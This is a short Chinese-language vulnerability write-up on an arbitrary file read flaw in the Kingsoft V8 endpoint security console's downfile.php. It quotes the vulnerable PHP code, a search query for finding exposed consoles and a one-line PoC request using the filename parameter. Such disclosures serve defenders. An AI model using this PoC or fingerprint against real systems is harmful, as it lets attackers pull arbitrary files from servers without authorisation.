# 金山 V8 终端安全系统 downfile.php 任意文件读取漏洞

## 漏洞描述

金山 V8 终端安全系统 存在任意文件读取漏洞，攻击者可以通过漏洞下载服务器任意文件

## 漏洞影响

<a-checkbox checked>金山 V8 终端安全系统</a-checkbox></br>

## 网络测绘

<a-checkbox checked>title="在线安装-V8+终端安全系统Web控制台"</a-checkbox></br>

## 漏洞复现

存在漏洞的文件 `/Console/htmltopdf/downfile.php`

```php
<?php	
			$filename= $_GET["filename"];
            
			$filename=iconv("UTF-8","GBK//IGNORE", $filename);

   			header("Cache-Control: public"); 
			header("Content-Description: File Transfer"); 
			header('Content-disposition: attachment; filename='.$filename); //文件名   
			header("Content-Type: application/zip"); //zip格式的   
			header("Content-Transfer-Encoding: binary"); //告诉浏览器，这是二进制文件    
			header('Content-Length: '. filesize($filename)); //告诉浏览器，文件大小   
			@readfile($filename);
			?>
```

文件中没有任何的过滤 通过filename参数即可下载任意文件，POC为

```plain
/htmltopdf/downfile.php?filename=downfile.php
```

![img](../../../.vuepress/public/img/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10-20220313111120246.png)



## 